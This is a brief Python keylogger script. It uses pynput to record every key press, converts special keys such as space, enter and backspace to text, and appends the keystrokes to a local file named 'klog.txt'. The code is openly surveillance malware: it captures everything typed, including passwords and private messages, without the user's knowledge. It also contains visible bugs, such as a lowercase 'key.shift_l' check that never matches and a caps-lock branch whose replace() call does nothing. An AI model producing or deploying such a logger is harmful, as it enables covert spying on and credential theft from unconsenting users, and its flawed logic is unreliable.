from pynput.keyboard  import Listener

def write_to_file(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    if keydata == "Key.space":
        keydata = " "
    elif keydata == "Key.enter":
        keydata = "\n"
    elif keydata == "Key.tab":
        keydata = "\t"
    elif keydata == "Key.backspace":
        keydata = "<BACKSPACE>"
    elif keydata == "Key.shift" or keydata == "Key.shift_r" or keydata == "key.shift_l":
        keydata = ""
    elif keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
        keydata = ""
    elif keydata == "Key.alt_l" or keydata == "Key.alt_r":
        keydata = ""  
    elif keydata == "Key.caps_lock":
        keydata = keydata.replace("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z", keydata.upper())
          
    with open("klog.txt", "a") as f:
        f.write(keydata)
        
with Listener(on_press=write_to_file) as l:
    l.join()